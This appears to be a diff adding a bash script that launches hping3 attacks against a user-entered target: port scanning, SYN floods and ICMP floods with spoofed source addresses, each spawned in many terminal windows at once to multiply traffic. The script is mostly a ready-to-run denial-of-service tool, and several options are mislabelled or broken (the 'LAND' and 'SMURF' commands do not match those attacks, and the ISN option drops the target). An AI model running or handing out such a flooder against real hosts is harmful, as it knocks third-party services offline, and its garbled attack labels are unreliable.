@@ -1,0 +1,76 @@
+#!/bin/bash
+
+# Check if hping3 is installed
+if ! command -v hping3 &> /dev/null
+then
+    echo "hping3 is not installed. Installing it now..."
+    sudo apt-get install -y hping3  # For Debian/Ubuntu-based systems
+fi
+
+# Get the target IP/hostname from the user
+read -p "Enter the target IP or hostname: " target
+
+# Display attack options
+echo "Select the attack type:"
+echo "1) Port Scanning"
+echo "2) SYN Flood Attack"
+echo "3) LAND Attack"
+echo "4) SMURF Attack"
+echo "5) TCP Sequence Prediction Attack (ISN Prediction)"
+read -p "Enter the number corresponding to your choice (1-5): " attack_choice
+
+# Get the number of terminals from the user
+read -p "How many terminals do you want to open for the attack? " term_count
+
+# Check if xterm or gnome-terminal is installed (adjust for your terminal emulator)
+if ! command -v xterm &> /dev/null && ! command -v gnome-terminal &> /dev/null
+then
+    echo "Neither xterm nor gnome-terminal is installed. Please install one of them."
+    exit 1
+fi
+
+# Determine the command based on the user's choice
+case $attack_choice in
+    1)
+        command="hping3 -S --scan 21-500 $target"
+        ;;
+    2)
+        command="hping3 -S -p 80 $target --flood"
+        ;;
+    3)
+        command="hping3 -S -p 80 $target -a 127.0.0.1"
+        ;;
+    4)
+        command="hping3 --icmp --flood $target -a 127.0.0.1"
+        ;;
+    5)
+        command="hping3 -S -p 80 -Q 127.0.0.1"
+        ;;
+    *)
+        echo "Invalid choice. Exiting."
+        exit 1
+        ;;
+esac
+
+# Open the attack command in multiple terminal windows
+for ((i = 1; i <= term_count; i++))
+do
+    if command -v xterm &> /dev/null
+    then
+        xterm -hold -e "$command" &
+    elif command -v gnome-terminal &> /dev/null
+    then
+        gnome-terminal -- bash -c "$command; exec bash" &
+    fi
+done
+
+# Arrange the windows in a grid using wmctrl if installed
+if command -v wmctrl &> /dev/null
+then
+    echo "Arranging windows in a grid..."
+    wmctrl -r :ACTIVE: -b add,maximized_vert,maximized_horz
+else
+    echo "You can manually arrange the windows or install 'wmctrl' for automatic window management."
+fi
+
+echo "$command initiated on $target across $term_count terminal windows."
